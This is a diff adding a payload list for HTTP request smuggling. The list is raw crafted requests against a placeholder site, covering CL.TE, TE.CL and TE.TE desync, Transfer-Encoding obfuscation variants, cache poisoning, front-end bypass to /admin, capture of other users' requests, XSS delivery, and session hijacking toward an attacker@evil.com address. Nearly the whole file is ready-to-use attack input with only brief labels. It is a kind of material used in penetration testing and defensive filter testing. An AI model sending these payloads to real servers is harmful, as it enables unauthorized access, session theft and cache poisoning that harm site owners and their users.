@@ -1,0 +1,526 @@
+# HTTP Request Smuggling Payloads
+
+# CL.TE (Content-Length vs Transfer-Encoding)
+# Front-end uses Content-Length, back-end uses Transfer-Encoding
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+---
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+
+---
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+---
+
+# TE.CL (Transfer-Encoding vs Content-Length)
+# Front-end uses Transfer-Encoding, back-end uses Content-Length
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+---
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
+
+x=
+0
+
+
+---
+
+# TE.TE (Transfer-Encoding obfuscation)
+# Both servers handle Transfer-Encoding but one can be obfuscated
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+---
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+---
+
+# Transfer-Encoding obfuscation variants
+Transfer-Encoding: chunked
+Transfer-Encoding: xchunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding: chunked
+Transfer-encoding: chunked
+Transfer-Encoding: chunked 
+Transfer-Encoding: chunked;
+Transfer-Encoding: chunked,
+Transfer-Encoding: identity
+Transfer-Encoding: identity, chunked
+Transfer-Encoding: chunked, identity
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+ Transfer-Encoding: chunked
+Transfer-Encoding : chunked
+Transfer-Encoding:chunked
+Transfer-Encoding:
+ chunked
+Transfer-Encoding:
+	chunked
+[space]Transfer-Encoding: chunked
+Transfer-Encoding[space]: chunked
+Transfer-Encoding:[space]chunked
+Transfer-Encoding: chu nked
+Transfer-Encoding: chunk ed
+Transfer-Encoding: chun\x0bked
+
+# CL.CL (Duplicate Content-Length)
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 8
+Content-Length: 7
+
+12345
+SMUGGLED
+
+---
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 8
+Content-Length: 9
+
+test=1
+SMUGGLED
+
+---
+
+# Cache poisoning via request smuggling
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+GET /static/script.js HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
+
+x=
+
+---
+
+# Bypassing front-end security controls
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 100
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-For: 127.0.0.1
+Content-Length: 10
+
+x=
+
+---
+
+# Capturing other users' requests
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 230
+Transfer-Encoding: chunked
+
+0
+
+POST /log HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1000
+
+comment=
+
+---
+
+# XSS via request smuggling
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GET /search?q=<script>alert(1)</script> HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
+
+x=
+
+---
+
+# Web cache deception
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 180
+Transfer-Encoding: chunked
+
+0
+
+GET /static/include.js HTTP/1.1
+Host: vulnerable-website.com
+X-Ignore: X
+
+GET /account HTTP/1.1
+Host: vulnerable-website.com
+
+---
+
+# Exploiting different chunk handling
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+96
+POST /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+csrf=token&action=delete
+0
+
+
+---
+
+# Timing-based detection payload
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+1
+Z
+Q
+
+---
+
+# Header injection for smuggling
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 200
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-Host: evil.com
+Content-Length: 10
+
+x=
+
+---
+
+# Session hijacking
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 250
+Transfer-Encoding: chunked
+
+0
+
+POST /account/update HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+
+email=attacker@evil.com&session=
+
+---
+
+# Smuggling with newlines
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding:
+ chunked
+Content-Length: 4
+
+5c
+SMUGGLED
+0
+
+
+---
+
+# Smuggling with tabs
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding:	chunked
+Content-Length: 4
+
+5c
+SMUGGLED
+0
+
+
+---
+
+# HTTP/2 downgrade smuggling
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+0
+
+SMUGGLED
+
+---
+
+# Chunk size obfuscation
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+
+0000000000000000000a
+SMUGGLED123
+0
+
+
+---
+
+# Negative Content-Length
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: -1
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+---
+
+# Very large Content-Length
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 999999999
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+---
+
+# Mixed line endings
+POST / HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+Content-Length: 4\r\n
+Transfer-Encoding: chunked\n
+\r\n
+5c\r\n
+SMUGGLED\r\n
+0\r\n
+\r\n
+
+---
+
+# Unicode in headers
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Transfer‐Encoding: identity
+
+0
+
+SMUGGLED
+
+---
+
+# Multiple Host headers
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Host: evil.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+---
+
+# Smuggling to internal endpoints
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GET /internal/admin HTTP/1.1
+Host: localhost
+X-Forwarded-For: 127.0.0.1
+Content-Length: 10
+
+x=
+
+---
+
+# Cookie injection via smuggling
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 180
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=stolen_session_here
+Content-Length: 10
+
+x=
+
+---
+
+# Authorization bypass
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 200
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Authorization: Bearer admin_token_here
+Content-Length: 10
+
+x=
+
+---
+
+# CRLF injection in chunks
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+
+0\r\n
+\r\n
+GET /admin HTTP/1.1\r\n
+Host: vulnerable-website.com\r\n
+\r\n
+
+---
+
+# Smuggling via Content-Type
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+---
+
+# Request line injection
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GPOST /admin HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
+
+x=
+
+---
+
+# Protocol smuggling (HTTP/1.1 -> HTTP/2)
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Upgrade: h2c
+Connection: Upgrade, HTTP2-Settings
+HTTP2-Settings: AAMAAABkAAQAAP__
+Content-Length: 4
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
